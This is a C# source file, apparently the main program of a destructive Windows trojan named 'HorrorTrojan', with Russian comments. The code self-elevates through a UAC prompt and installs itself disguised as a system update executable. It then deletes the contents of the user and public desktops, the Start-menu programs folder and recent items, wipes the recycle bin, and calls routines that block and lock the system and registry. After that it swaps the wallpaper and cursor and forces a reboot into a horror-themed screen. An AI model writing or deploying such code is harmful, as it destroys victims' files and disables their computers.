using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace HorrorTrojan
{
    internal static class Program
    {
        private static Mutex mutex;
        
        [STAThread]
        static void Main(string[] args)
        {
            bool createdNew;
            mutex = new Mutex(true, "Global\\HorrorTrojanMutex", out createdNew);
            
            if (!createdNew)
            {
                return;
            }
            
            try
            {
                string updatePath = @"C:\Windows\ProgramFiles\SystemUpdate\update.exe";
                
                if (args.Length > 0 && args[0] == "stage2")
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    
                    // === ПРАВИЛЬНЫЙ ПОРЯДОК ЗАПУСКА ===
                    // 1. Сначала создаем оба окна
                    BloodEffect blood = new BloodEffect();
                    MainInterface ui = new MainInterface();
                    
                    // 2. Показываем кровь
                    blood.Show();
                    
                    // 3. Показываем интерфейс поверх крови
                    ui.Show();
                    
                    // 4. Запускаем главный цикл сообщений
                    Application.Run();
                    return;
                }
                
                if (!IsElevated())
                {
                    RestartAsAdmin();
                    return;
                }
                
                if (!File.Exists(updatePath) || Assembly.GetExecutingAssembly().Location != updatePath)
                {
                    ResourceExtractor.ExtractAll();
                    SystemBlocker.BlockEverything();
                    RegistryLocker.LockEverything();
                    
                    // === УДАЛЕНИЕ СОДЕРЖИМОГО РАБОЧЕГО СТОЛА ===
                    DeleteDesktopContents();
                    
                    ApplyWallpaper();
                    ApplyCursors();
                    
                    Process.Start(updatePath, "stage2");
                    
                    var psi = new ProcessStartInfo("shutdown", "/r /f /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                    Environment.Exit(0);
                }
                else
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    
                    BloodEffect blood = new BloodEffect();
                    MainInterface ui = new MainInterface();
                    
                    blood.Show();
                    ui.Show();
                    
                    Application.Run();
                }
            }
            finally
            {
                if (mutex != null)
                {
                    mutex.ReleaseMutex();
                    mutex.Dispose();
                }
            }
        }
        
        private static bool IsElevated()
        {
            using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
            {
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
        }
        
        private static void RestartAsAdmin()
        {
            var psi = new ProcessStartInfo
            {
                FileName = Assembly.GetExecutingAssembly().Location,
                Verb = "runas",
                UseShellExecute = true,
                CreateNoWindow = true
            };
            Process.Start(psi);
            Environment.Exit(0);
        }
        
        private static void DeleteDesktopContents()
        {
            try
            {
                // Получаем путь к рабочему столу текущего пользователя
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string publicDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
                
                // Удаляем файлы и папки с рабочего стола
                DeleteAllFilesAndFolders(desktopPath);
                DeleteAllFilesAndFolders(publicDesktopPath);
                
                // Удаляем все ярлыки из папки "Programs" (меню Пуск)
                string programsPath = Environment.GetFolderPath(Environment.SpecialFolder.Programs);
                DeleteAllFilesAndFolders(programsPath);
                
                // Удаляем быстрый доступ (Recent Documents)
                string recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                DeleteAllFilesAndFolders(recentPath);
                
                // Очищаем корзину (через shell32)
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = "/c rd /s /q C:\\$Recycle.bin",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
                catch { }
            }
            catch { }
        }
        
        private static void DeleteAllFilesAndFolders(string path)
        {
            try
            {
                if (!Directory.Exists(path)) return;
                
                // Удаляем все файлы
                foreach (string file in Directory.GetFiles(path))
                {
                    try
                    {
                        // Пропускаем системные файлы (если они есть)
                        FileInfo fi = new FileInfo(file);
                        if ((fi.Attributes & FileAttributes.System) == FileAttributes.System)
                            continue;
                        
                        File.Delete(file);
                    }
                    catch { }
                }
                
                // Удаляем все папки
                foreach (string dir in Directory.GetDirectories(path))
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(dir);
                        if ((di.Attributes & FileAttributes.System) == FileAttributes.System)
                            continue;
                        
                        Directory.Delete(dir, true);
                    }
                    catch { }
                }
            }
            catch { }
        }
        
        private static void ApplyWallpaper()
        {
            string path = @"C:\Windows\ProgramFiles\SystemUpdate\wallpaper.jpg";
            if (File.Exists(path))
                NativeMethods.SystemParametersInfo(NativeMethods.SPI_SETDESKWALLPAPER, 0, path, 
                    NativeMethods.SPIF_UPDATEINIFILE | NativeMethods.SPIF_SENDWININICHANGE);
        }
        
        private static void ApplyCursors()
        {
            string aniPath = @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani";
            if (File.Exists(aniPath))
            {
                IntPtr hCursor = NativeMethods.LoadImage(IntPtr.Zero, aniPath, NativeMethods.IMAGE_CURSOR, 0, 0, 
                    NativeMethods.LR_LOADFROMFILE);
                if (hCursor != IntPtr.Zero)
                {
                    NativeMethods.SetSystemCursor(NativeMethods.CopyIcon(hCursor), NativeMethods.OCR_NORMAL);
                    NativeMethods.DestroyIcon(hCursor);
                }
            }
            NativeMethods.SystemParametersInfo(NativeMethods.SPI_SETCURSORS, 0, IntPtr.Zero, 0);
        }
    }
}
